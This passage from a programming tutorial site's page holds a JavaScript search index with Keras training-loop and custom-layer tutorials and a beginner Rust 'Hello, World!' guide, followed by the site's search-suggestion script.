model(inputs) loss = loss_fn(logits, targets) # Backward pass model.zero_grad() loss.backward() # Optimizer variable updates optimizer.step() # Log every 100 batches. if step % 100 == 0: print( f\"Training loss (for 1 batch) at step {step}: {loss.detach().numpy():.4f}\" ) print(f\"Seen so far: {(step + 1) * batch_size} samples\") As an alternative, let’s look at what the loop looks like when using a Keras optimizer and a Keras loss function.\nImportant differences:\nYou retrieve the gradients for the variables via v.value.grad, called on each trainable variable. You update your variables via optimizer.apply(), which must be called in a torch.no_grad() scope. model = get_model() optimizer = keras.optimizers.Adam(learning_rate=1e-3) loss_fn = keras.losses.CategoricalCrossentropy(from_logits=True) for epoch in range(epochs): print(f\"\\nStart of epoch {epoch}\") for step, (inputs, targets) in enumerate(train_dataloader): # Forward pass logits = model(inputs) loss = loss_fn(targets, logits) # Backward pass model.zero_grad() trainable_weights = [v for v in model.trainable_weights] # Call torch.Tensor.backward() on the loss to compute gradients # for the weights. loss.backward() gradients = [v.value.grad for v in trainable_weights] # Update weights with torch.no_grad(): optimizer.apply(gradients, trainable_weights) # Log every 100 batches. if step % 100 == 0: print( f\"Training loss (for 1 batch) at step {step}: {loss.detach().numpy():.4f}\" ) print(f\"Seen so far: {(step + 1) * batch_size} samples\") Low-level handling of metrics linkLet’s add metrics monitoring to this basic training loop.\nYou can readily reuse built-in Keras metrics (or custom ones you wrote) in such training loops written from scratch. Here’s the flow:\n-Instantiate the metric at the start of the loop -Call metric.update_state() after each batch -Call metric.result() when you need to display the current value of the metric -Call metric.reset_state() when you need to clear the state of the metric (typically at the end of an epoch)\nLet’s use this knowledge to compute CategoricalAccuracy on training and validation data at the end of each epoch:\n# Get a fresh model model = get_model() # Instantiate an optimizer to train the model. optimizer = keras.optimizers.Adam(learning_rate=1e-3) # Instantiate a loss function. loss_fn = keras.losses.CategoricalCrossentropy(from_logits=True) # Prepare the metrics. train_acc_metric = keras.metrics.CategoricalAccuracy() val_acc_metric = keras.metrics.CategoricalAccuracy() Here’s our training \u0026 evaluation loop:\nfor epoch in range(epochs): print(f\"\\nStart of epoch {epoch}\") for step, (inputs, targets) in enumerate(train_dataloader): # Forward pass logits = model(inputs) loss = loss_fn(targets, logits) # Backward pass model.zero_grad() trainable_weights = [v for v in model.trainable_weights] # Call torch.Tensor.backward() on the loss to compute gradients # for the weights. loss.backward() gradients = [v.value.grad for v in trainable_weights] # Update weights with torch.no_grad(): optimizer.apply(gradients, trainable_weights) # Update training metric. train_acc_metric.update_state(targets, logits) # Log every 100 batches. if step % 100 == 0: print( f\"Training loss (for 1 batch) at step {step}: {loss.detach().numpy():.4f}\" ) print(f\"Seen so far: {(step + 1) * batch_size} samples\") # Display metrics at the end of each epoch. train_acc = train_acc_metric.result() print(f\"Training acc over epoch: {float(train_acc):.4f}\") # Reset training metrics at the end of each epoch train_acc_metric.reset_state() # Run a validation loop at the end of each epoch. for x_batch_val, y_batch_val in val_dataloader: val_logits = model(x_batch_val, training=False) # Update val metrics val_acc_metric.update_state(y_batch_val, val_logits) val_acc = val_acc_metric.result() val_acc_metric.reset_state() print(f\"Validation acc: {float(val_acc):.4f}\") Low-level handling of losses tracked by the model linkLayers \u0026 models recursively track any losses created during the forward pass by layers that call self.add_loss(value). The resulting list of scalar loss values are available via the property model.losses at the end of the forward pass.\nIf you want to be using these loss components, you should sum them and add them to the main loss in your training step.\nConsider this layer, that creates an activity regularization loss:\nclass ActivityRegularizationLayer(keras.layers.Layer): def call(self, inputs): self.add_loss(1e-2 * torch.sum(inputs)) return inputs Let’s build a really simple model that uses it:\ninputs = keras.Input(shape=(784,), name=\"digits\") x = keras.layers.Dense(64, activation=\"relu\")(inputs) # Insert activity regularization as a layer x = ActivityRegularizationLayer()(x) x = keras.layers.Dense(64, activation=\"relu\")(x) outputs = keras.layers.Dense(10, name=\"predictions\")(x) model = keras.Model(inputs=inputs, outputs=outputs) Here’s what our training loop should look like now:\n# Get a fresh model model = get_model() # Instantiate an optimizer to train the model. optimizer = keras.optimizers.Adam(learning_rate=1e-3) # Instantiate a loss function. loss_fn = keras.losses.CategoricalCrossentropy(from_logits=True) # Prepare the metrics. train_acc_metric = keras.metrics.CategoricalAccuracy() val_acc_metric = keras.metrics.CategoricalAccuracy() for epoch in range(epochs): print(f\"\\nStart of epoch {epoch}\") for step, (inputs, targets) in enumerate(train_dataloader): # Forward pass logits = model(inputs) loss = loss_fn(targets, logits) if model.losses: loss = loss + torch.sum(*model.losses) # Backward pass model.zero_grad() trainable_weights = [v for v in model.trainable_weights] # Call torch.Tensor.backward() on the loss to compute gradients # for the weights. loss.backward() gradients = [v.value.grad for v in trainable_weights] # Update weights with torch.no_grad(): optimizer.apply(gradients, trainable_weights) # Update training metric. train_acc_metric.update_state(targets, logits) # Log every 100 batches. if step % 100 == 0: print( f\"Training loss (for 1 batch) at step {step}: {loss.detach().numpy():.4f}\" ) print(f\"Seen so far: {(step + 1) * batch_size} samples\") # Display metrics at the end of each epoch. train_acc = train_acc_metric.result() print(f\"Training acc over epoch: {float(train_acc):.4f}\") # Reset training metrics at the end of each epoch train_acc_metric.reset_state() # Run a validation loop at the end of each epoch. for x_batch_val, y_batch_val in val_dataloader: val_logits = model(x_batch_val, training=False) # Update val metrics val_acc_metric.update_state(y_batch_val, val_logits) val_acc = val_acc_metric.result() val_acc_metric.reset_state() print(f\"Validation acc: {float(val_acc):.4f}\") "
            }
        );
    index.add(
            {
                id:  273 ,
                href: "\/tutorials\/docs\/keras\/keras\/writing_cross_framework_custom_components\/",
                title: "Writing cross-framework custom components",
                description: "...",
                content: "Keras enables you to write custom Layers, Models, Metrics, Losses, and Optimizers that work across TensorFlow, JAX, and PyTorch with the same codebase. Let’s take a look at custom layers first.\nThe keras.ops namespace contains:\nAn implementation of the NumPy API, e.g. keras.ops.stack or keras.ops.matmul. A set of neural network specific ops that are absent from NumPy, such as keras.ops.conv or keras.ops.binary_crossentropy. Let’s make a custom Dense layer that works with all backends: class MyDense(keras.layers.Layer): def __init__(self, units, activation=None, name=None): super().__init__(name=name) self.units = units self.activation = keras.activations.get(activation) def build(self, input_shape): input_dim = input_shape[-1] self.w = self.add_weight( shape=(input_dim, self.units), initializer=keras.initializers.GlorotNormal(), name=\"kernel\", trainable=True, ) self.b = self.add_weight( shape=(self.units,), initializer=keras.initializers.Zeros(), name=\"bias\", trainable=True, ) def call(self, inputs): # Use Keras ops to create backend-agnostic layers/metrics/etc. x = keras.ops.matmul(inputs, self.w) + self.b return self.activation(x) Next, let’s make a custom Dropout layer that relies on the keras.random namespace:\nclass MyDropout(keras.layers.Layer): def __init__(self, rate, name=None): super().__init__(name=name) self.rate = rate # Use seed_generator for managing RNG state. # It is a state element and its seed variable is # tracked as part of `layer.variables`. self.seed_generator = keras.random.SeedGenerator(1337) def call(self, inputs): # Use `keras.random` for random ops. return keras.random.dropout(inputs, self.rate, seed=self.seed_generator) Next, let’s write a custom subclassed model that uses our two custom layers:\nclass MyModel(keras.Model): def __init__(self, num_classes): super().__init__() self.conv_base = keras.Sequential( [ keras.layers.Conv2D(64, kernel_size=(3, 3), activation=\"relu\"), keras.layers.Conv2D(64, kernel_size=(3, 3), activation=\"relu\"), keras.layers.MaxPooling2D(pool_size=(2, 2)), keras.layers.Conv2D(128, kernel_size=(3, 3), activation=\"relu\"), keras.layers.Conv2D(128, kernel_size=(3, 3), activation=\"relu\"), keras.layers.GlobalAveragePooling2D(), ] ) self.dp = MyDropout(0.5) self.dense = MyDense(num_classes, activation=\"softmax\") def call(self, x): x = self.conv_base(x) x = self.dp(x) return self.dense(x) Let’s compile it and fit it:\nmodel = MyModel(num_classes=10) model.compile( loss=keras.losses.SparseCategoricalCrossentropy(), optimizer=keras.optimizers.Adam(learning_rate=1e-3), metrics=[ keras.metrics.SparseCategoricalAccuracy(name=\"acc\"), ], ) model.fit( x_train, y_train, batch_size=batch_size, epochs=1, # For speed validation_split=0.15, ) 399/399 ━━━━━━━━━━━━━━━━━━━━ 70s 174ms/step - acc: 0.5104 - loss: 1.3473 - val_acc: 0.9256 - val_loss: 0.2484 "
            }
        );
    index.add(
            {
                id:  274 ,
                href: "\/tutorials\/docs\/rust\/rust\/first_rust_program\/",
                title: "Your First Rust Program",
                description: "Learn to write, compile, and run your first simple Rust program. Understand the basics of Rust compilation and execution.",
                content: "Welcome to your first adventure in Rust programming! In this post, we’ll take a detailed walk through the process of writing, compiling, and executing a simple Rust program. We’ll cover everything you need to know to get started, from setting up your project to understanding each line of code.\nGetting Started with Rust linkBefore we dive into writing code, make sure you have Rust installed. If you haven’t installed Rust yet, refer to the previous post on Getting Started with Rust.\nStep 1: Create Your Project linkFirst, we need to set up a new Rust project. Rust projects are created and managed with Cargo, Rust’s package manager and build system.\nOpen your terminal or command prompt and run the following command:\ncargo new hello_rust cd hello_rust This command creates a new directory called hello_rust which contains all necessary files for a Rust project:\nCargo.toml: The manifest file for your project. This file contains metadata and dependencies of your project. src: A directory containing your source files, starting with main.rs. Step 2: Write Your First Rust Program linkNavigate to the src directory and open the main.rs file in your favorite text editor. You will see that Cargo has already placed a simple program there for you:\nfn main() { println!(\"Hello, World!\"); } Let’s break this down:\nfn main() { ... }: This defines the main function, which is the entry point of every Rust program. All Rust programs start executing from the main function. println!(\"Hello, World!\");: This line of code uses the println! macro to print text to the console. In Rust, macros are denoted by the !. Step 3: Understanding What You Wrote linkThe println! macro is very powerful and commonly used in Rust for printing output. It can print not just simple strings, but also formatted data. For example:\nlet name = \"Rust\"; println!(\"Hello, {}!\", name); This will print “Hello, Rust!” where {} is replaced by the value of name.\nStep 4: Compile and Run Your Program linkNow that you’ve written your program, it’s time to compile and run it:\ncargo run When you execute this command, several things happen:\nCompilation: Cargo checks your code for errors and compiles it into a binary executable. Execution: If the compilation is successful, Cargo then runs the binary executable. You should see the output:\nHello, World! Conclusion linkCongratulations! You’ve just written, compiled, and run your first Rust program. This simple example has introduced you to the basics of Rust projects, the structure of a Rust program, and how to use Cargo to manage and run Rust code.\nIn our next post, we’ll explore more about Rust’s variable bindings, types, and operations, which will help you write more complex programs. Stay tuned and happy coding!\n"
            }
        );
    index.add(
            {
                id:  275 ,
                href: "\/tutorials\/docs\/zig\/",
                title: "Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: ""
            }
        );
    search.addEventListener('input', show_results, true);

    function show_results(){
        const maxResult =  5 ;
        const minlength =  0 ;
        var searchQuery = sanitizeHTML(this.value);
        var results = index.search(searchQuery, {limit: maxResult, enrich: true});

        
        const flatResults = new Map(); 
        for (const result of results.flatMap(r => r.result)) {
        if (flatResults.has(result.doc.href)) continue;
        flatResults.set(result.doc.href, result.doc);
        }

        suggestions.innerHTML = "";
        suggestions.classList.remove('d-none');

        
        if (searchQuery.length < minlength) {
            const minCharMessage = document.createElement('div')
            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
            minCharMessage.classList.add("suggestion__no-results");
            suggestions.appendChild(minCharMessage);
            return;
        } else {
            
            if (flatResults.size === 0 && searchQuery) {
                const noResultsMessage = document.createElement('div')
                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
                noResultsMessage.classList.add("suggestion__no-results");
                suggestions.appendChild(noResultsMessage);
                return;
            }
        }

        
        for(const [href, doc] of flatResults) {
            const entry = document.createElement('div');
            suggestions.appendChild(entry);

            const a = document.createElement('a');
            a.href = href;
            entry.appendChild(a);

            const title = document.createElement('span');
            title.textContent = doc.title;
            title.classList.add("suggestion__title");
            a.appendChild(title);

            const description = document.createElement('span');
            description.textContent = doc.description;
            description.classList.add("suggestion__description");
            a.appendChild(description);

            suggestions.appendChild(entry);

            if(suggestions.childElementCount == maxResult) break;
        }
    }
    }());
</script>
    
</body></html>